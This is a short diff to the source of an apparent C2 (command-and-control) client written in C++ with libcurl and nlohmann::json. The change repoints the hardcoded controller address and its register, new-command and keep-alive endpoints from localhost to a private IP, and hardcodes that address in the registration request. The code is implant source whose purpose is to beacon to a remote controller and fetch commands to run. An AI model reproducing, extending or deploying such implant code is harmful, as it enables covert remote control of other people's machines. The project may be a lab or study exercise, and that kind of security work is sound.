@@ -10,7 +10,7 @@
 
 using json = nlohmann::json;
 
-#define C2_HOST "http://127.0.0.1:1234"
+#define C2_HOST "http://172.20.224.1:1234"
 #define REGISTER_URI C2_HOST"/c2/register"
 #define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command"
 #define KEEP_ALIVE_URI C2_HOST"/c2/keep_alive"
@@ -51,10 +51,10 @@ private:
         std::cout << "client id: " << payload["client_id"] << std::endl;
 
         /* We always set the Content-Type to be json*/
-        headers = curl_slist_append(headers, "Content-Type: application/json");
+        headers = curl_slist_append(headers, "Content-Type: application/json; charset=utf-8");
         curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
 
-        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:1234/c2/register/");
+        curl_easy_setopt(curl, CURLOPT_URL, "http://172.20.224.1:1234/c2/register/");
         if (post)
         {
             curl_easy_setopt(curl, CURLOPT_POST, 1L);
